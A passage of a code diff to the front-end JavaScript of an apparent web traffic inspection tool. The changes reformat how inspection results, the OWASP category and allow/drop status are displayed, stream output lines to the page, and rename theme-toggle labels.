+          `TRIGGERED RULE:   ${data.rule_triggered || 'CLEAN-TRAFFIC'}`,
+          `OWASP CATEGORY:   ${data.owasp_category || 'None'}`,
           `INSPECTION ENGINE: SmartParse Lexical AST + DFA`,
           `CRYPTO SIGNATURE: ${data.action === 'ALLOW' ? 'VALID_ORIGIN_TOKEN_ISSUED' : 'DROPPED_AT_EDGE'}`,
           `-------------------------------------------------------`,
           `EVALUATION TELEMETRY:`,
           JSON.stringify(data, null, 2)
-        ].join("\\n");
+        ];
+
+        await streamLinesToOutput(output, lines);
       } catch (err) {
-        statusPill.innerText = "ERROR";
-        statusPill.style.color = "var(--accent-red)";
+        statusPill.innerText = "[ERROR]";
+        statusPill.style.color = "var(--terracotta)";
         output.innerText = "Inspection request failed: " + err;
       }
     }
 
     function updateThemeBtnText(theme) {
       const btn = document.getElementById("theme-btn");
-      if (btn) btn.innerHTML = theme === "light" ? "🌾 DARK CREAM" : "🌙 OBSIDIAN";
+      if (btn) btn.innerText = theme === "light" ? "THEME: ARCHIVAL" : "THEME: CARBON";
     }
 
     function toggleLandingTheme() {
@@ -698,7 +322,6 @@
       updateThemeBtnText(next);
     }
 
-    // Restore theme preference
     const savedTheme = localStorage.getItem("sg_theme") || "dark";
     document.documentElement.setAttribute("data-theme", savedTheme);
     updateThemeBtnText(savedTheme);
